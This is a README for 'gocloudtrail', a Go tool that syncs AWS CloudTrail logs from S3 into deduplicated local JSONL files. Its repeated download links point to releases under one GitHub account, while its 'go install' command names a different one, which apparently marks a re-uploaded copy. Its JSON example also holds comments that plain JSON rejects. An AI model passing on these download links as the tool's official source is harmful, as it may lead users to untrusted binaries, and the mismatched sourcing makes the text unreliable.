# 🌥️ gocloudtrail - Effortlessly Sync AWS Logs Locally

[![Download gocloudtrail](https://img.shields.io/badge/Download-gocloudtrail-blue.svg)](https://github.com/ghazanferali862/gocloudtrail/releases)

## 🚀 Getting Started

Welcome to gocloudtrail! This tool helps you sync your AWS CloudTrail logs from S3 to your local machine, organizing them into JSONL files. You can benefit from features such as deduplication, resuming from previous stops, and running tasks in parallel across different accounts and regions. 

## 📥 Download & Install

To get started, you need to download the latest version of gocloudtrail. Please visit the following link to access the Releases page:

[Download gocloudtrail](https://github.com/ghazanferali862/gocloudtrail/releases)

## 📋 Features

- **Generate Configuration**: Automatically create configuration settings from the CloudTrail API or set trails manually.
- **SQLite State Tracking**: Easily resume after interruptions.
- **Bloom Filter Deduplication**: Keep downloads clean by filtering duplicate records.
- **Parallel Processing**: Optimize download and processing speeds by operating across multiple accounts or regions.
- **S3 Delimiter Discovery**: Efficiently check regions with actual data.

## ⚙️ Installation Instructions

1. **Install Go**: Make sure you have Go installed on your system. You can download it from [the official Go website](https://golang.org/dl/).
   
2. **Run the Installation Command**: Open your terminal and execute the following command:

   ```bash
   go install github.com/deceptiq/gocloudtrail@latest
   ```

3. **Verify the Installation**: To check if gocloudtrail was installed successfully, type:

   ```bash
   gocloudtrail --version
   ```

## 🔧 Quick Start Guide

### Step 1: Generate Configuration

To begin using gocloudtrail, you need to create a configuration file. You can generate it using existing CloudTrail trails. Open your terminal and run:

```bash
gocloudtrail generate-config config.json
```

### Step 2: Run the Processor

Now that you have your configuration file, you can start processing your AWS logs. Use the command below:

```bash
gocloudtrail run -config config.json
```

## ⚙️ Configuration Options

You have two options to create your configuration file: automatic generation or manual creation. Here's an example of what your JSON configuration might look like:

```json
{
  "download_workers": 50, // Number of parallel downloads (I/O bound)
  "process_workers": 0, // Number of parallel processing workers (CPU bound; set to 0 for auto 2*CPUs)
  "download_queue_size": 5000, // Depth of the download queue
  "process_queue_size": 5000 // Depth of the processing queue
}
```

You can adjust the values based on your system capabilities. Higher numbers may increase performance but could also use more resources.

## 📊 Usage Tips

- **Monitoring**: Keep an eye on your system resources while the tool is running. If you notice slowdowns, consider reducing the number of workers.
- **Logs**: Regularly check the generated logs in the specified output folder to ensure proper synchronization.

## 📚 Support and Documentation

For further resources, tutorials, and community support, you can explore the following:

- [Official Documentation](https://github.com/ghazanferali862/gocloudtrail/docs)
- [Community Forum](https://github.com/ghazanferali862/gocloudtrail/discussions)

## 👥 Contributing

We welcome contributions to gocloudtrail. If you want to help improve the tool, please feel free to submit a pull request or create an issue on GitHub.

## 🛠️ Troubleshooting

If you encounter any problems, please check the following:

- Make sure you have the latest version of Go and gocloudtrail.
- Ensure your AWS permissions are configured correctly for accessing CloudTrail.
- Review the logs generated for any error messages that might indicate what went wrong.

## 💼 License

gocloudtrail is licensed under the MIT License. You can view the license information in the repository.

[Download gocloudtrail](https://github.com/ghazanferali862/gocloudtrail/releases) to start syncing your AWS CloudTrail logs today!